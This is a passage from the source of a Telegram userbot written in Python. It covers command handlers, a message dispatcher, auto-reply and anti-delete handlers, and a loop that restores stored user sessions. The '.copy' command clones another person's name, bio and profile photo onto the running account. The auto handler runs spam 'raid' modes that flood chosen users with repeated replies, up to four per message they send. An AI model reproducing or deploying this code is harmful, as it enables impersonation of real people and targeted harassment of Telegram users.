            uptime = int(time.time() - user_bot.START_TIME) if user_bot.START_TIME else 0
            await safe_edit(event, f"✅ Userbot Status\n━━━━━━━━━━━━━━━\n⏱️ Uptime: {uptime}s\n👑 Admins: {len(user_bot.admins)}\n⚙️ Mode: Operational")

        @register_cmd("flip")
        async def cmd_flip(event, _):
            await safe_edit(event, f"🎲 Coin Flip\n━━━━━━━━━━━━━━━\n👉 {random.choice(['Heads', 'Tails'])}")

        @register_cmd("dice")
        async def cmd_dice(event, _):
            await safe_edit(event, f"🎲 Dice Roll\n━━━━━━━━━━━━━━━\n👉 {random.randint(1, 6)}")

        # ─── COPY, NORMAL, BANNER, NC ───
        @register_cmd("copy")
        async def cmd_copy(event, args):
            if not is_admin(event.sender_id):
                return await safe_edit(event, "❌ Only admins can use this command.")
            reply = await event.get_reply_message()
            target = None
            if reply:
                try:
                    if reply.sender_id:
                        target = await user_bot.get_entity(reply.sender_id)
                except:
                    pass
                if not target and getattr(reply, "fwd_from", None):
                    try:
                        fid = reply.fwd_from.from_id
                        if fid:
                            target = await user_bot.get_entity(fid)
                    except:
                        pass
            if not target and args:
                try:
                    target = await user_bot.get_entity(args.strip())
                except:
                    pass
            if not target:
                return await safe_edit(event, "❌ Reply / user / ID")
            me2 = await user_bot.get_me()
            if target.id == me2.id:
                return await safe_edit(event, "⚠️ Self clone blocked")
            if user_bot.CLONE_ACTIVE and user_bot.LAST_CLONE_ID == target.id:
                return await safe_edit(event, "⚠️ Already cloned")
            await safe_edit(event, "⚡ Clone Init...")
            if not user_bot.CLONE_ACTIVE:
                try:
                    full = await user_bot(functions.users.GetFullUserRequest(me2.id))
                    user_bot.CLONE_DATA["name"] = me2.first_name
                    user_bot.CLONE_DATA["last"] = me2.last_name
                    user_bot.CLONE_DATA["bio"] = full.full_user.about
                    user_bot.CLONE_DATA["username"] = me2.username
                    dp = await user_bot.download_profile_photo("me", file=bytes, download_big=True)
                    if dp:
                        bio = BytesIO(dp)
                        bio.name = "orig.jpg"
                        user_bot.CLONE_DATA["photo_bytes"] = bio
                    user_bot.CLONE_ACTIVE = True
                except:
                    pass
            try:
                await safe_edit(event, "⚡ Cloning Name...")
                await user_bot(functions.account.UpdateProfileRequest(first_name=target.first_name or "", last_name=target.last_name or ""))
                await safe_edit(event, "⚡ Cloning Bio...")
                tfull = await user_bot(functions.users.GetFullUserRequest(target.id))
                bio_text = (tfull.full_user.about or "")[:70]
                await user_bot(functions.account.UpdateProfileRequest(about=""))
                await asyncio.sleep(0.7)
                await user_bot(functions.account.UpdateProfileRequest(about=bio_text))
                await safe_edit(event, "⚡ Cloning PFP...")
                file = await user_bot.download_profile_photo(target, file=bytes, download_big=True)
                if file:
                    bio = BytesIO(file)
                    bio.name = "clone.jpg"
                    up = await user_bot.upload_file(bio)
                    cur = await user_bot.get_profile_photos("me", limit=1)
                    if cur:
                        await user_bot(functions.photos.DeletePhotosRequest(id=[cur[0]]))
                    await user_bot(functions.photos.UploadProfilePhotoRequest(file=up))
                user_bot.LAST_CLONE_ID = target.id
                await safe_edit(event, "✅ Clone Complete")
            except Exception as e:
                await safe_edit(event, f"❌ Clone error: {e}")

        @register_cmd("normal")
        async def cmd_normal(event, _):
            if not is_admin(event.sender_id):
                return await safe_edit(event, "❌ Only admins can use this command.")
            if not user_bot.CLONE_ACTIVE:
                return await safe_edit(event, "⚠️ No clone active")
            try:
                await safe_edit(event, "⚡ Restoring...")
                await user_bot(functions.account.UpdateProfileRequest(first_name=user_bot.CLONE_DATA.get("name") or "", last_name=user_bot.CLONE_DATA.get("last") or ""))
                await user_bot(functions.account.UpdateProfileRequest(about=""))
                await asyncio.sleep(0.7)
                await user_bot(functions.account.UpdateProfileRequest(about=user_bot.CLONE_DATA.get("bio") or ""))
                cur = await user_bot.get_profile_photos("me", limit=1)
                if cur:
                    await user_bot(functions.photos.DeletePhotosRequest(id=[cur[0]]))
                if user_bot.CLONE_DATA.get("photo_bytes"):
                    bio = user_bot.CLONE_DATA["photo_bytes"]
                    bio.name = "restore.jpg"
                    up = await user_bot.upload_file(bio)
                    await user_bot(functions.photos.UploadProfilePhotoRequest(file=up))
                user_bot.CLONE_ACTIVE = False
                user_bot.LAST_CLONE_ID = None
                user_bot.CLONE_DATA.clear()
                await safe_edit(event, "✅ Original restored")
            except Exception as e:
                await safe_edit(event, f"❌ Restore error: {e}")

        @register_cmd("banner", needs_reply=True)
        async def cmd_banner(event, _):
            if not is_admin(event.sender_id):
                return await safe_edit(event, "❌ Only admins can use this command.")
            reply = await event.get_reply_message()
            if not reply or not reply.media:
                return await safe_edit(event, "❌ Reply to photo/video")
            await safe_edit(event, "⚡ Processing banner...")
            try:
                try:
                    saved = await reply.forward_to("me")
                except:
                    file = await reply.download_media(file=bytes)
                    if not file:
                        return await safe_edit(event, "❌ Download fail")
                    bio = BytesIO(file)
                    bio.name = "banner"
                    saved = await user_bot.send_file("me", bio)
                user_bot.menu_banner_msg = (saved.chat_id, saved.id)
                save_banner()
                await safe_edit(event, f"🖼️ Banner set (ID: {saved.id})")
            except Exception as e:
                await safe_edit(event, f"❌ Error: {e}")

        @register_cmd("rembanner")
        async def cmd_rembanner(event, _):
            if not is_admin(event.sender_id):
                return await safe_edit(event, "❌ Only admins can use this command.")
            if not user_bot.menu_banner_msg:
                return await safe_edit(event, "⚠️ No banner")
            try:
                chat_id2, msg_id = user_bot.menu_banner_msg
                try:
                    await user_bot.delete_messages(chat_id2, [msg_id])
                except:
                    pass
                user_bot.menu_banner_msg = None
                save_banner()
                await safe_edit(event, "🗑️ Banner removed")
            except Exception as e:
                await safe_edit(event, f"❌ Error: {e}")

        @register_cmd("nc")
        async def cmd_nc(event, arg):
            if not is_admin(event.sender_id):
                return await safe_edit(event, "❌ Only admins can use this command.")
            if not arg:
                return await safe_edit(event, "❌ Usage: .nc set <lang> <text>  or  .nc stop")
            parts = arg.strip().split(maxsplit=2)
            if len(parts) < 2:
                return await safe_edit(event, "❌ Invalid. Use: .nc set <lang> <text>  or  .nc stop")
            action = parts[0].lower()
            if action == "stop":
                user_bot.NC_STATE["active"] = False
                if user_bot.NC_STATE.get("task") and not user_bot.NC_STATE["task"].done():
                    user_bot.NC_STATE["task"].cancel()
                    try:
                        await user_bot.NC_STATE["task"]
                    except asyncio.CancelledError:
                        pass
                user_bot.NC_STATE["task"] = None
                await safe_edit(event, "🛑 Name Changer stopped.")
                return
            elif action == "set":
                if len(parts) < 3:
                    return await safe_edit(event, "❌ Give language and text.\nExample: `.nc set hindi Zyrex`")
                lang = parts[1].lower()
                text = parts[2]
                allowed = {"hindi","urdu","bengali","bihari","english","emoji"}
                if lang not in allowed:
                    return await safe_edit(event, f"❌ Language must be one of: {', '.join(allowed)}")
                if user_bot.NC_STATE.get("task") and not user_bot.NC_STATE["task"].done():
                    user_bot.NC_STATE["task"].cancel()
                    try:
                        await user_bot.NC_STATE["task"]
                    except asyncio.CancelledError:
                        pass
                user_bot.NC_STATE["active"] = True
                user_bot.NC_STATE["lang"] = lang
                user_bot.NC_STATE["text"] = text
                user_bot.NC_STATE["chat_id"] = event.chat_id
                task = asyncio.create_task(nc_loop(event.chat_id, lang, text))
                user_bot.NC_STATE["task"] = task
                await safe_edit(event, f"✅ Name Changer started with language `{lang}` and text `{text}`.")
            else:
                await safe_edit(event, "❌ Invalid action. Use `set` or `stop`.")

        # ─── DISPATCHER ───
        @user_bot.on(events.NewMessage)
        async def dispatcher(event):
            text = event.raw_text
            if not text:
                return
            if text.startswith("."):
                prefix = "."
                body = text[1:].strip()
            elif text.startswith("!") and event.sender_id in OWNER_IDS:
                prefix = "!"
                body = text[1:].strip()
            else:
                return
            if not body:
                return
            parts = body.split(maxsplit=1)
            cmd = parts[0].lower()
            arg = parts[1] if len(parts) > 1 else ""
            cmd_data = commands.get(cmd)
            if not cmd_data:
                return
            sender = event.sender_id
            if not sender:
                return

            # ── ALL COMMANDS require owner or admin ──
            if prefix == "!":
                if sender not in OWNER_IDS:
                    await safe_edit(event, "❌ You are not the owner.")
                    return
            else:
                if sender not in OWNER_IDS and sender not in user_bot.admins:
                    await safe_edit(event, "@zyrex_x_aetherbot use kro ye sab use krna hai toh")
                    return
                if cmd in owner_only_commands and sender not in OWNER_IDS:
                    await safe_edit(event, "❌ Owner only command")
                    return

            if cmd_data.get("needs_reply") and not event.is_reply and not arg:
                return await safe_edit(event, f"❌ Reply or pass target")
            if cmd_data.get("group_only"):
                try:
                    if not event.is_group:
                        return await safe_edit(event, "⚠️ Group only command")
                except:
                    return
            try:
                await cmd_data["func"](event, arg)
            except FloodWaitError as fw:
                await safe_edit(event, f"⏳ FloodWait: {fw.seconds}s")
            except Exception as e:
                await safe_edit(event, f"❌ Error: {str(e)[:50]}")

        # ─── AUTO HANDLER ───
        @user_bot.on(events.NewMessage)
        async def auto_handler(event):
            if event.out:
                return
            sender = event.sender_id
            chat = event.chat_id
            if not sender or sender in OWNER_IDS:
                return
            if sender in user_bot.muted_users or sender in user_bot.global_muted:
                try:
                    await event.delete()
                except:
                    pass
                return
            ws_key = (chat, sender)
            if ws_key in user_bot.watch_spam:
                now = time.time()
                entry = user_bot.watch_spam[ws_key]
                entry["times"] = [t for t in entry["times"] if now - t < entry["seconds"]]
                entry["times"].append(now)
                if len(entry["times"]) > entry["limit"]:
                    try:
                        await event.delete()
                    except:
                        pass
                    return
            if chat in user_bot.group_locks:
                if not is_admin(sender):
                    try:
                        await event.delete()
                    except:
                        pass
                    return
            now = time.time()
            last_reply = user_bot.reply_cooldowns.get(sender, 0)
            if now - last_reply < 1.0:
                return
            try:
                if sender in user_bot.reply_users:
                    await safe_send(chat, random.choice(reply_list), reply_to=event.id)
                    user_bot.reply_cooldowns[sender] = now
                if sender in user_bot.replygod_users:
                    for _ in range(4):
                        await safe_send(chat, random.choice(reply_texts), reply_to=event.id)
                        await asyncio.sleep(0.3)
                    user_bot.reply_cooldowns[sender] = now
                if sender in user_bot.flag_users:
                    await safe_send(chat, random.choice(flag_texts), reply_to=event.id)
                    user_bot.reply_cooldowns[sender] = now
                if sender in user_bot.hrr_users:
                    await safe_send(chat, random.choice(heart_replies), reply_to=event.id)
                    user_bot.reply_cooldowns[sender] = now
                if sender in user_bot.rr_users:
                    bot_msg = await safe_send(chat, random.choice(fun_texts), reply_to=event.id)
                    try:
                        await user_bot(functions.messages.SendReactionRequest(
                            peer=chat, msg_id=bot_msg.id,
                            reaction=[types.ReactionEmoji(emoticon="🤣")]
                        ))
                    except:
                        pass
                    user_bot.reply_cooldowns[sender] = now
                if sender in user_bot.custom_raid_users:
                    data = user_bot.custom_raid_users.get(sender)
                    if data and data.get("count", 0) > 0:
                        await safe_send(chat, data.get("text", ""), reply_to=event.id)
                        data["count"] = data["count"] - 1
                        if data["count"] <= 0:
                            del user_bot.custom_raid_users[sender]
                        user_bot.reply_cooldowns[sender] = now
                if sender in user_bot.shayari_raid:
                    remaining = user_bot.shayari_raid[sender]
                    if now - user_bot.reply_cooldowns.get(sender, 0) >= 1.5:
                        await safe_send(chat, random.choice(shayari_texts), reply_to=event.id)
                        user_bot.reply_cooldowns[sender] = now
                        if remaining is not None:
                            if remaining > 1:
                                user_bot.shayari_raid[sender] = remaining - 1
                            else:
                                del user_bot.shayari_raid[sender]
                if sender in user_bot.rizz_raid:
                    remaining = user_bot.rizz_raid[sender]
                    if now - user_bot.reply_cooldowns.get(sender, 0) >= 1.5:
                        await safe_send(chat, random.choice(rizz_texts), reply_to=event.id)
                        user_bot.reply_cooldowns[sender] = now
                        if remaining is not None:
                            if remaining > 1:
                                user_bot.rizz_raid[sender] = remaining - 1
                            else:
                                del user_bot.rizz_raid[sender]
            except Exception as e:
                print(f"Auto reply error: {e}")

        # ─── CACHE & ANTI-DELETE ───
        @user_bot.on(events.NewMessage(outgoing=True))
        async def cache_own(event):
            if not user_bot.antidel_enabled:
                return
            try:
                msg_id = event.id
                chat = event.chat_id
                if msg_id and chat:
                    user_bot.antidel_cache[msg_id] = {"chat_id": chat, "text": event.raw_text or "", "time": time.time()}
                    if len(user_bot.antidel_cache) > 300:
                        oldest = sorted(user_bot.antidel_cache, key=lambda k: user_bot.antidel_cache[k]["time"])
                        for k in oldest[:50]:
                            user_bot.antidel_cache.pop(k, None)
            except:
                pass

        @user_bot.on(events.MessageDeleted)
        async def on_delete(event):
            if not user_bot.antidel_enabled:
                return
            try:
                for msg_id in (event.deleted_ids or []):
                    entry = user_bot.antidel_cache.pop(msg_id, None)
                    if entry:
                        chat_id = entry.get("chat_id")
                        text = entry.get("text")
                        if chat_id and text:
                            await safe_send(chat_id, f"♻️ **[Anti-Delete]**\n{text}")
            except:
                pass

        @user_bot.on(events.NewMessage)
        async def auto_react(event):
            sender = event.sender_id
            if not sender:
                return
            if event.out:
                emoji = user_bot.auto_react_emoji
                if not emoji:
                    return
                try:
                    await user_bot(functions.messages.SendReactionRequest(
                        peer=event.chat_id,
                        msg_id=event.id,
                        reaction=[types.ReactionEmoji(emoticon=emoji)]
                    ))
                except:
                    pass
                return
            if sender in user_bot.react_targets:
                emoji = user_bot.react_targets[sender]
                if not emoji:
                    return
                try:
                    await user_bot(functions.messages.SendReactionRequest(
                        peer=event.chat_id,
                        msg_id=event.id,
                        reaction=[types.ReactionEmoji(emoticon=emoji)]
                    ))
                except:
                    pass

        # ─── START USERBOT ───
        await main_bot.send_message(chat_id, f"🔥 **Your Userbot is now Active!**\n👤 {me.first_name}\n💡 Use `.menu` to get started.")
        await user_bot.run_until_disconnected()

    except asyncio.CancelledError:
        print("Userbot task cancelled.")
    except Exception as e:
        if "SESSION_INVALID" not in str(e):
            print(f"Userbot crashed: {e}")
            try:
                await main_bot.send_message(chat_id, f"⚠️ **Userbot crashed:** {str(e)[:100]}\nIt will restart automatically in 5 seconds...")
            except:
                pass
        raise
    finally:
        active_userbots.pop(chat_id, None)
        if user_bot is not None:
            try:
                await user_bot.disconnect()
            except:
                pass
        try:
            if user_bot is not None:
                await main_bot.send_message(chat_id, "🛑 Userbot stopped.")
        except:
            pass

# ─── WEB SERVER ───
from flask import Flask
import threading

app = Flask(__name__)

@app.route('/')
@app.route('/health')
def home():
    return "✅ Userbot is running 24/7!"

def run_web():
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

# ─── MAIN ───
if __name__ == "__main__":
    print("🚀 Main bot starting with Web Server...")

    loop = asyncio.get_event_loop()
    loop.run_until_complete(init_db())
    loop.run_until_complete(init_cipher())

    sessions = loop.run_until_complete(load_sessions())
    for uid, sess_str in sessions.items():
        try:
            asyncio.create_task(run_user_bot_with_restart(sess_str, uid))
            print(f"✅ Restored session for user {uid}")
        except Exception as e:
            print(f"❌ Failed to restore {uid}: {e}")
            loop.run_until_complete(delete_session(uid))

    threading.Thread(target=run_web, daemon=True).start()
    main_bot.run_until_disconnected()